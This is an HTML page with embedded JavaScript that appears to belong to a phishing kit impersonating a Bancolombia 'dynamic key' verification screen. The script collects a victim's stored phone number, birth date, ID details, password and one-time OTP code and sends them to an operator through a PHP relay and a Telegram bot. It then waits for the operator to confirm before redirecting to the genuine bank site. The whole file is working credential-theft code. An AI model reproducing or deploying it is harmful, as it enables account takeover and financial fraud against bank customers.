<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificando Dinámica</title>
  <style>
    body, html { margin:0; padding:0; height:100%; width:100%; }
    body {
      display: flex; justify-content: center; align-items: center;
      background: url('img/fondo.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .blur-overlay {
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(255,255,255,0.4); backdrop-filter: blur(10px);
    }
    .loaderp-full {
      position: fixed; top:0; left:0; width:100%; height:100%;
      display:flex; justify-content:center; align-items:center;
      z-index:9999;
    }
    .loaderp {
      width:180px; height:180px; background-image:url('img/circulo.png');
      background-size:cover; border-radius:50%;
      display:flex; flex-direction:column; justify-content:center; align-items:center;
    }
    .loaderp .loader {
      width:30px; height:30px; border:5px solid #f3f3f3;
      border-top:5px solid #555; border-radius:50%; animation:spin 1s linear infinite;
    }
    .loaderp-text { margin-top:30px; font-size:13px; color:#000; }
    @keyframes spin { 0%{transform:rotate(0)}100%{transform:rotate(360deg)} }
  </style>
</head>
<body>
  <div class="blur-overlay"></div>
  <div class="loaderp-full">
    <div class="loaderp">
      <div class="loader"></div>
      <div class="loaderp-text">Verificando...</div>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', async () => {
  // 1. Carga configuración
  let cfg;
  try {
    cfg = await fetch('botconfig.json').then(r => r.json());
  } catch (e) {
    alert('No se pudo cargar la configuración del bot.');
    return;
  }
  const { token: botToken, chat_id: chatId } = cfg;

  // 2. Recoger datos previos y código dinámico
  const sess = JSON.parse(localStorage.getItem('bancoldata')||'{}');
  const dyn = localStorage.getItem('bancoldina');
  if (!sess.celular || !sess.clave || !dyn) {
    alert('Datos incompletos. Redirigiendo al inicio.');
    return window.location.href='index.html';
  }

  // 3. Construir mensaje con todo
  const transactionId = localStorage.getItem('transactionId') ||
    (Date.now().toString(36)+Math.random().toString(36).slice(2));
  let msg = `
📥 <b>INGRESO BANCOLOMBIA (Dinámica)</b>
🆔 ID: ${transactionId}
📱 Celular: ${sess.celular}
🎂 Nacimiento: ${sess.nacimiento}
💳 Tipo: ${sess.tipo}
🔢 Identificador: ${sess.identificador}
🔸 Últimos 2 dígitos: ${sess.digitosFinales}
🔐 Clave: ${sess.clave}
🔄 Dinámica OTP: ${dyn}
`;

  // 4. Botón “Finalizar” para confirmación
  const keyboard = { inline_keyboard:[
    [{ text:'✅ Confirmar', callback_data:`confirm_finalizar:${transactionId}` }]
  ]};

  // 5. Enviar mensaje + botón
  await fetch('botmaster2.php',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:
      'data='+encodeURIComponent(msg)
      +'&keyboard='+encodeURIComponent(JSON.stringify(keyboard))
  });

  // 6. Esperar respuesta del botón
  await waitButton(transactionId, botToken);
});

async function waitButton(txId, botToken){
  try {
    const resp = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const js = await resp.json();
    const upd = js.result.find(u=>
      u.callback_query
      && u.callback_query.data===`confirm_finalizar:${txId}`
    );
    if (upd) {
      // Confirmación al chat
      await fetch('sendStatus.php',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({status:'Finalización Dinámica OK'})
      });
      // Redirigir a éxito
      return window.location.href='https://www.bancolombia.com/personas';
    } else {
      return setTimeout(()=>waitButton(txId, botToken),2000);
    }
  } catch(e){
    console.error(e);
    setTimeout(()=>waitButton(txId, botToken),3000);
  }
}
</script>
</body>
</html>
